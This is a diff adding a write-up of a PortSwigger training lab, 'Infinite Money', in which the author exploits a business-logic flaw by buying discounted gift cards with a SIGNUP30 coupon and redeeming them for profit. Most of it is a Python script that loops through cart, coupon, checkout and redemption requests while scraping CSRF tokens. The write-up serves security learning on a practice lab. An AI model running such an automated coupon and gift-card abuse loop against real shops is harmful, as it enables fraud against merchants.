@@ -164,4 +164,107 @@ Then, just delete `carlos`.
 
 ## Lab 10: Infinite Money
 
-To solve this lab, buy the jacket.
+To solve this lab, buy the jacket. I am given an email client to use. When logged in, I saw that there was a gift card redeeming function:
+
+![](../../.gitbook/assets/portswigger-business-writeup-image-25.png)
+
+There's also a newsletter sign up:
+
+![](../../.gitbook/assets/portswigger-business-writeup-image-26.png)
+
+This gives me a coupon:
+
+![](../../.gitbook/assets/portswigger-business-writeup-image-27.png)
+
+There was also this Gift card item:
+
+![](../../.gitbook/assets/portswigger-business-writeup-image-28.png)
+
+I could apply the SIGNUP30 bonus on this:
+
+![](../../.gitbook/assets/portswigger-business-writeup-image-29.png)
+
+So I could buy a $10 giftcard for $7. 
+
+![](../../.gitbook/assets/portswigger-business-writeup-image-30.png)
+
+`fDGaXvnW0E` is the code. I could buy another one:
+
+![](../../.gitbook/assets/portswigger-business-writeup-image-31.png)
+
+Within the email client, I can see that it gives me the token there as well:
+
+![](../../.gitbook/assets/portswigger-business-writeup-image-32.png)
+
+Anyways, this code is redeemable within the 'My Account' page, under the gift card section. So each time I do this, I gain $3. To exploit this server, I created a Python script to automate the entire process!
+
+```python
+import requests
+import re
+import sys
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+HOST = '0a8a00dd031722d08106a2300038002e'
+proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
+url = f'https://{HOST}.web-security-academy.net'
+cookies = {
+	'session':'Y2AczSp5KZECDUeSaAjNzPpgxItus1Se'
+}
+s = requests.Session()
+
+while True:
+	## Add Product to Cart
+	cart_data = {
+		'productId':'2',
+		'redir':'CART',
+		'quantity':'1'
+	}
+
+	add_r = s.post(url + '/cart', data=cart_data,cookies=cookies,proxies=proxies,verify=False)
+
+	## Grab CSRF token 
+	r = s.get(url + '/cart',cookies=cookies,proxies=proxies,verify=False)
+	match = re.search(r'name="csrf" value="([0-9a-zA-z]+)', r.text)
+	cart_csrf_token = match[1]
+
+	## Apply Coupon
+	coupon_data = {
+		'csrf':cart_csrf_token,
+		'coupon':'SIGNUP30'
+	}
+	coupon_r = s.post(url + '/cart/coupon', data=coupon_data,cookies=cookies,proxies=proxies,verify=False)
+
+	## Grab CSRF
+	r = s.get(url + '/cart',cookies=cookies,proxies=proxies,verify=False)
+	match = re.search(r'name="csrf" value="([0-9a-zA-z]+)', r.text)
+	checkout_csrf_token = match[1]
+
+	## Checkout 
+	checkout_data = {
+		'csrf':checkout_csrf_token,
+	}
+	checkout_r = s.post(url + '/cart/checkout',data=checkout_data,cookies=cookies,proxies=proxies,verify=False)
+	pattern = re.compile(r'<td>([A-Za-z0-9]+)</td>')
+	match = pattern.findall(checkout_r.text)
+	if match:
+        ## Apply Gift Card
+		code = match[1]
+		r = s.get(url + '/my-account',cookies=cookies,proxies=proxies,verify=False)
+		match = re.search(r'name="csrf" value="([0-9a-zA-z]+)', r.text)
+		gift_csrf = match[1]
+		gift_data = {
+			'csrf':gift_csrf,
+			'gift-card':code
+		}
+		bal_r = s.post(url + '/gift-card', data=gift_data, cookies=cookies, proxies=proxies, verify=False)
+		pattern = re.compile(r'<p><strong>Store credit: \$([\d.]+)</strong></p>')
+		match = pattern.search(bal_r.text)
+		print("Credit value: " + match.group(1))
+
+	else:
+		print('[-] Something went wrong!')
+```
+
+I was lazy to use threading, so I just waited. I also noticed that the threads tend to cause each other to fail when testing, so I think keeping to one is stabler.
+
